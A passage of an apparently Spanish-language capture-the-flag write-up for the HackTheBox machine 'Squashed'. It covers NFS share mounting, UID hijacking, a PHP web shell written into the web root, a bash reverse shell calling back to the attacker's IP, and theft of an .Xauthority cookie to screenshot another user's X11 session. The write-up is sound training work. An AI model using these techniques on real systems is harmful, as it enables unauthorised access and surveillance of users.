</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Nmap scan report <span style="color:#fff;font-weight:bold">for</span> 10.129.228.109
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Host is up (0.039s latency).
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>Not shown: <span style="color:#ff0;font-weight:bold">1492</span> open|filtered udp ports (no-response)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>PORT      STATE  SERVICE
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>111/udp   open   rpcbind
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>464/udp   closed kpasswd5
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>1035/udp  closed mxxrlogin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>2049/udp  open   nfs
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>18994/udp closed unknown
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>20288/udp closed unknown
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>23230/udp closed unknown
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>30473/udp closed unknown</span></span></code></pre></div>
<h1 id="nfs-enumeration">NFS Enumeration</h1>
<p>Me llama la atención el servicio NFS expuesto ya que no es común encontrarse con esto.</p>
<p>Vamos a instalar el paquete <code>nfs-common</code>
<code>sudo apt-get install nfs-common -y</code></p>
<p>Ahora vamos a montar la raíz del sistema de archivos al directorio <code>/mnt/montura</code></p>
<p>Primero creamos la carpeta.
<code>mkdir /mnt/montura</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sudo mount -t nfs 10.129.228.109:/ /mnt/montura</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ ls -la /mnt/montura
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>total <span style="color:#ff0;font-weight:bold">12</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>drwxr-xr-x <span style="color:#ff0;font-weight:bold">20</span> root root <span style="color:#ff0;font-weight:bold">4096</span> oct <span style="color:#ff0;font-weight:bold">21</span>  <span style="color:#ff0;font-weight:bold">2022</span> .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>drwxr-xr-x  <span style="color:#ff0;font-weight:bold">1</span> root root   <span style="color:#ff0;font-weight:bold">14</span> ago  <span style="color:#ff0;font-weight:bold">5</span> 15:49 ..
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>drwxr-xr-x  <span style="color:#ff0;font-weight:bold">4</span> root root <span style="color:#ff0;font-weight:bold">4096</span> oct <span style="color:#ff0;font-weight:bold">21</span>  <span style="color:#ff0;font-weight:bold">2022</span> home
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>drwxr-xr-x <span style="color:#ff0;font-weight:bold">16</span> root root <span style="color:#ff0;font-weight:bold">4096</span> oct <span style="color:#ff0;font-weight:bold">21</span>  <span style="color:#ff0;font-weight:bold">2022</span> var</span></span></code></pre></div>
<p>Y vemos contenido.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ find . -type f 2&gt;/dev/null
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>./ross/.xsession-errors.old
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>./ross/Documents/Passwords.kdbx
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>./ross/.xsession-errors
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>./ross/.Xauthority</span></span></code></pre></div>
<p>Vemos un <code>Passwords.kdbx</code> que me llama la atención.</p>
<p>Investigando la bbdd de keepass, no encuentro nada que se pueda hacer ya que <code>keepass2john</code> no soporta la versión de KeePass con la que fue creada la base de datos.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ keepass2john Passwords.kdbx 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>! Passwords.kdbx : File version <span style="color:#0ff;font-weight:bold">&#39;40000&#39;</span> is currently not supported!</span></span></code></pre></div>
<h1 id="uid-hijacking---foothold">UID Hijacking -&gt; Foothold</h1>
<p>Me dió curiosidad lo siguiente
No podía acceder al directorio <code>html</code> que supongo que corresponderá con el sitio web.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ <span style="color:#fff;font-weight:bold">cd</span> html/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>bash: cd: html/: Permission denied</span></span></code></pre></div>
<p>Pero con <code>find .</code> podía ver algunos directorio y ficheros de dentro del directorio <code>html</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ find .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>./html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>find: ‘./html/.htaccess’: Permission denied
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>./html/.htaccess
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>find: ‘./html/index.html’: Permission denied
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>./html/index.html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>find: ‘./html/images’: Permission denied
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>./html/images
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>find: ‘./html/css’: Permission denied
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>./html/css
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>find: ‘./html/js’: Permission denied
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>./html/js</span></span></code></pre></div>
<p>Y me dí cuenta de que podríamos hacer un UID Hijacking
<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
<p>Podemos crear un usuario con el UID <code>2017</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sudo useradd -u <span style="color:#ff0;font-weight:bold">2017</span> pointedc</span></span></code></pre></div>
<p>Y ahora en principio podríamos acceder a este directorio.
<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
<p>Ahora si cambiamos al usuario <code>pointedc</code> podemos acceder al directorio y por ejemplo, crear archivos.
<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
<p>Y se refleja en el sitio web.
<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
<p>Podemos comprobar si el sitio interpreta PHP, aunque leyendo el <code>.htaccess</code> ya nos da la pista de que sí.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ <span style="color:#fff;font-weight:bold">echo</span> <span style="color:#0ff;font-weight:bold">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span> &gt; test.php</span></span></code></pre></div>
<p><img src="images/Screenshot_5.png" alt="Write-up Image"></p>
<p>Nos creamos una pequeña web shell.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ cat shell.php 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>&lt;?php <span style="color:#fff;font-weight:bold">echo</span> <span style="color:#0ff;font-weight:bold">&#39;&lt;pre&gt;&#39;</span> . shell_exec($_GET[<span style="color:#0ff;font-weight:bold">&#39;cmd&#39;</span>]) . <span style="color:#0ff;font-weight:bold">&#39;&lt;/pre&gt;&#39;</span>; ?&gt;</span></span></code></pre></div>
<p>Y ya nos podemos mandar la rev shell
<code>http://10.129.228.109/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.14.18/443%200%3E%261%22</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ff0;font-weight:bold">443</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>listening on [any] <span style="color:#ff0;font-weight:bold">443</span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>connect to [10.10.14.18] from (UNKNOWN) [10.129.228.109] <span style="color:#ff0;font-weight:bold">58462</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>bash: cannot <span style="color:#fff;font-weight:bold">set</span> terminal process group (1050): Inappropriate ioctl <span style="color:#fff;font-weight:bold">for</span> device
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>bash: no job control in this shell
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>alex@squashed:/var/www/html$ 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>alex@squashed:/var/www/html$ whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>alex</span></span></code></pre></div>
<p>Y ya podemos leer la flag de usuario</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>alex@squashed:/var/www/html$ cat /home/alex/user.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>cat /home/alex/user.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>f469293aeb9ecd01....</span></span></code></pre></div>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Si nos damos cuenta, hemos ganado acceso como el usuario <code>alex</code> y en el NFS, estaba el directorio personal de trabajo de un usuario llamado <code>ross</code></p>
<p>Dentro de este directorio se encontraba un archivo <code>.Xauthority</code> pero todavía no lo había analizado porque ya tengo un usuario en mi máquina con ese UID.</p>
<p>Me interesa tanto este archivo porque podemos enumerar que el usuario <code>ross</code> tiene una sesión activa en el equipo</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>alex@squashed:/home/alex$ w
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>w
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span> 10:10:41 up <span style="color:#ff0;font-weight:bold">41</span> min,  <span style="color:#ff0;font-weight:bold">1</span> user,  load average: 0.00, 0.00, 0.00
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>ross     tty7     :0               09:29   41:36   3.57s  0.03s /usr/libexec/gnome-session-binary --systemd --session=gnome</span></span></code></pre></div>
<p>Y con este archivo <code>.XAuthority</code> que es de <code>ross</code> podría conseguir ver la pantalla de este usuario y quizás se filtre información confidencial.</p>
<p>Tengo dos opciones, o asignar una Shell a este usuario para poder migrar a este, o cambiar el UID de este usuario y crear otro usuario con el UID 1001.
<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
<p>Voy asignarle una shell temporalmente..
<code>$ sudo usermod --shell /bin/bash '_laurel'</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sudo su <span style="color:#0ff;font-weight:bold">&#39;_laurel&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>┌─[_laurel@parrot]─[/mnt/montura/home/ross]
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>└──╼ $</span></span></code></pre></div>
<p>Ahora ya puedo migrar a este usuario.</p>
<p>Me voy a copiar este archivo.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$cp .Xauthority /tmp/.Xauthority</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sudo chown pointedsec:pointedsec .Xauthority</span></span></code></pre></div>
<p>Ahora siguiendo <a href="https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11">este</a> apartado de HackTricks.</p>
<p>Me comparto este archivo a la máquina víctima.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>alex@squashed:/home/alex$ wget http://10.10.14.18:8081/.Xauthority</span></span></code></pre></div>
<p>Recapitulemos, este archivo contiene una Cookie de 128 bits que el cliente manda al servidor, esta cookie sirve para la autorización de X11, que en palabras simples y &ldquo;mal&rdquo;, sería como una especie de RDP.</p>
<p><img src="images/Screenshot_7.png" alt="Write-up Image"></p>
<p>Exportamos la cookie.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>alex@squashed:/home/alex$ <span style="color:#fff;font-weight:bold">export</span> XAUTHORITY=/home/alex/.Xauthority
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span><span style="color:#fff;font-weight:bold">export</span> XAUTHORITY=/home/alex/.Xauthority</span></span></code></pre></div>
<p>Nos responde con información de la pantalla, por lo cual esto es bueno.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>alex@squashed:/home/alex$ xdpyinfo -display :0 | less
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>xdpyinfo -display :0 | less
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>WARNING: terminal is not fully functional
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>-  (press RETURN)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>name of display:    :0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>version number:    11.0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>vendor string:    The X.Org Foundation
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>vendor release number:    <span style="color:#ff0;font-weight:bold">12013000</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>X.Org version: 1.20.13
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>maximum request size:  <span style="color:#ff0;font-weight:bold">16777212</span> bytes
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>motion buffer size:  <span style="color:#ff0;font-weight:bold">256</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>bitmap unit, bit order, padding:    32, LSBFirst, <span style="color:#ff0;font-weight:bold">32</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>image byte order:    LSBFirst
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>number of supported pixmap formats:    <span style="color:#ff0;font-weight:bold">7</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>supported pixmap formats:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>    depth 1, bits_per_pixel 1, scanline_pad <span style="color:#ff0;font-weight:bold">32</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>    depth 4, bits_per_pixel 8, scanline_pad <span style="color:#ff0;font-weight:bold">32</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>    depth 8, bits_per_pixel 8, scanline_pad <span style="color:#ff0;font-weight:bold">32</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>    depth 15, bits_per_pixel 16, scanline_pad <span style="color:#ff0;font-weight:bold">32</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>    depth 16, bits_per_pixel 16, scanline_pad <span style="color:#ff0;font-weight:bold">32</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>    depth 24, bits_per_pixel 32, scanline_pad <span style="color:#ff0;font-weight:bold">32</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>    depth 32, bits_per_pixel 32, scanline_pad <span style="color:#ff0;font-weight:bold">32</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>keycode range:    minimum 8, maximum <span style="color:#ff0;font-weight:bold">255</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>focus:  window 0x1e00006, revert to PointerRoot
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>number of extensions:    <span style="color:#ff0;font-weight:bold">28</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>    BIG-REQUESTS
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>    Composite
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>.....</span></span></code></pre></div>
<p>Ahora podemos hacer una captura de pantalla de la sesión <code>:0</code> que habíamos detectado antes con el comando <code>w</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>alex@squashed:/tmp$ xwd -root -screen -silent -display :0 &gt; screenshot.xwd
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>xwd -root -screen -silent -display :0 &gt; screenshot.xwd
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>alex@squashed:/tmp$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>screenshot.xwd</span></span></code></pre></div>
<p>Ahora nos pasamos este archivo a nuestra máquina de atacante y la convertimos a PNG</p>






